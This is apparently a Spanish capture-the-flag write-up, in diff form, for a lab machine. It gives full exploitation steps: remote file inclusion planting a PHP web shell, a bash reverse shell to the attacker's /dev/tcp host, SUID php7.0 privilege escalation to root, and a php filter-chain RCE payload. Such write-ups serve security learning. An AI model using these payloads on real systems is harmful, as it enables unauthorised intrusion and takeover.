@@ -1,0 +1,135 @@
+I"�:<h2 id="enumeracion">Enumeracion</h2>
+
+<p>Iniciamos con un escaneo de nmap donde encontraremos el puerto 80(HTTP)</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.88</span>
+</code></pre></div></div>
+<ul>
+  <li>
+    <p>sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si el puerto esta abierto</p>
+  </li>
+  <li>
+    <p>n: para que no haga resolucion DNS y tarde menos el escaneo</p>
+  </li>
+  <li>
+    <p>Pn: para evitar el descubrimiento de hosts</p>
+  </li>
+  <li>
+    <p>open: para que solo muestre los puertos abiertos</p>
+  </li>
+  <li>
+    <p>-p-: para que escanee todo el rango de puertos</p>
+  </li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PORT</span>   <span class="no">STATE</span> <span class="no">SERVICE</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>
+</code></pre></div></div>
+
+<h2 id="explorando-el-sitio-web">Explorando el sitio web</h2>
+
+<p>No pondre la parte donde hice directory fuzzing por que lo unico interesante que encontraremos es un archivo llamado <strong>connect.php</strong> pero no sera de utilidad.</p>
+
+<p>Si exploramos el sito web podemos ver que tenemos un navbar con varias opciones, donde al seleccionar una, se incluye la pagina seleccionada, como se ve en la imagen</p>
+
+<p><img src="/assets/img/quick/1.png" alt="" /></p>
+
+<p>Igual si vemos el codigo fuente podemos ver lo mismo:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;nav&gt;</span>
+        <span class="nt">&lt;ul&gt;</span>
+            <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?page=home"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+            <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?page=cars"</span><span class="nt">&gt;</span>Cars<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+            <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?page=maintenance_and_repair"</span><span class="nt">&gt;</span>Maintenance <span class="err">&amp;</span> Repair<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+            <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?page=about"</span><span class="nt">&gt;</span>About<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+            <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?page=contact"</span><span class="nt">&gt;</span>Contact<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+        <span class="nt">&lt;/ul&gt;</span>
+    <span class="nt">&lt;/nav&gt;</span>
+</code></pre></div></div>
+
+<p>Cuando tenemos casos asi de que se incluyen paginas y que ademas se pueda ver en la URL, como nuestro caso (index.php?page=cars), es un indicio para probar LFI (Local File Inclusion) o RFI (Remote File Inclusion)</p>
+
+<h2 id="explotacion-rfi---remote-file-inclusion">Explotacion (RFI - Remote File Inclusion)</h2>
+
+<p><strong>RFI</strong>: Remote File Inclusion es una vulnerabilidad que permite incluir archivos externos y/o remotos al servidor web</p>
+
+<p>Como mencione, la idea es lograr incluir archivos externos, por lo que, para probar, podemos crearnos un servidor web con python  y ver si recibimos una peticion de la maquina victima</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 8080
+</code></pre></div></div>
+<p>Ahora en la URL del sitio web pondremos:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.88</span><span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="nf">php?</span><span class="n">page</span><span class="o">=</span><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.73</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span>
+</code></pre></div></div>
+
+<p>Y nos llega una peticion:</p>
+
+<p><img src="/assets/img/quick/2.png" alt="" /></p>
+
+<p>Oberva que en la peticion que hizo, esta esperando por archivos con extension .php: <strong>GET /.php HTTP/1.0</strong></p>
+
+<p>Ahora para poder “subir” una web shell debemos de hacer lo mismo, pero indicarle un archivo php que queremos, en mi caso creare este:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="n">cmd</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>Y observa como se realizo la peticion correctamente</p>
+
+<p><img src="/assets/img/quick/3.png" alt="" /></p>
+
+<p>Pareciera que el archivo se incluyo, y que accediendo a: <strong>http://192.168.1.88/shell.php</strong> lo podremos ejecutar, pero en realidad no, debemos de hacerlo desde la misma URL de la siguiente forma</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.88</span><span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="nf">php?</span><span class="n">page</span><span class="o">=</span><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.73</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">shell</span><span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="nb">id</span>
+</code></pre></div></div>
+<p>Y hemos conseguido RCE</p>
+
+<p><img src="/assets/img/quick/4.png" alt="" /></p>
+
+<p>Ahora nos enviaremos una reverse shell con bash</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.88</span><span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="nf">php?</span><span class="n">page</span><span class="o">=</span><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.73</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">shell</span><span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="n">bash</span> <span class="o">-</span><span class="n">c</span> <span class="s2">"bash -i &gt;%26 /dev/tcp/&lt;tu_ip&gt;/443 0&gt;%261"</span>
+</code></pre></div></div>
+
+<p><img src="/assets/img/quick/5.png" alt="" /></p>
+
+<p>En este punto podemos leer la flag de user del directorio del usuario <strong>andrew</strong> ya que tiene permisos de lectura para otros</p>
+
+<p><img src="/assets/img/quick/6.png" alt="" /></p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<p>Si buscamos por binarios SUID encontraremos el PHP 7.0:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+
+/usr/bin/php7.0
+</code></pre></div></div>
+
+<p>Haciendo una pequeña busqueda en GFTOBins  encontraremos una forma de hacernos root ingresando esto:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo install</span> <span class="nt">-m</span> <span class="o">=</span>xs <span class="si">$(</span>which php<span class="si">)</span> <span class="nb">.</span>
+
+<span class="nv">CMD</span><span class="o">=</span><span class="s2">"/bin/sh"</span>
+./php <span class="nt">-r</span> <span class="s2">"pcntl_exec('/bin/sh', ['-p']);"</span>
+</code></pre></div></div>
+<p>Pero no es necesario, lo unico que debemos de ejecutar es</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/php7.0 <span class="nt">-r</span> <span class="s2">"pcntl_exec('/bin/bash', ['-p']);"</span>
+</code></pre></div></div>
+
+<p>Ya seremos root y podemos leer la flag</p>
+
+<p><img src="/assets/img/quick/7.png" alt="" /></p>
+
+<h2 id="intrusion-via-no-intencionada">Intrusion (via no intencionada)</h2>
+
+<p>Otra manera de poder conseguir RCE que posiblemente no sea intencionadas es haciendo uso de <strong>filter chain</strong>,  para realizarlo podemos hacer uso de este script que automatiza la creacion del payload usando php filters chains: <a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
+
+<p>Para el ejemplo generare el payload que haga uso de la funcion system para ejecutar el comando <strong>id</strong></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="n">php_filter_chain_generator</span><span class="p">.</span><span class="nf">py</span> <span class="o">--</span><span class="n">chain</span> <span class="s1">'&lt;?php system("id"); ?&gt;'</span>
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp  
+</code></pre></div></div>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
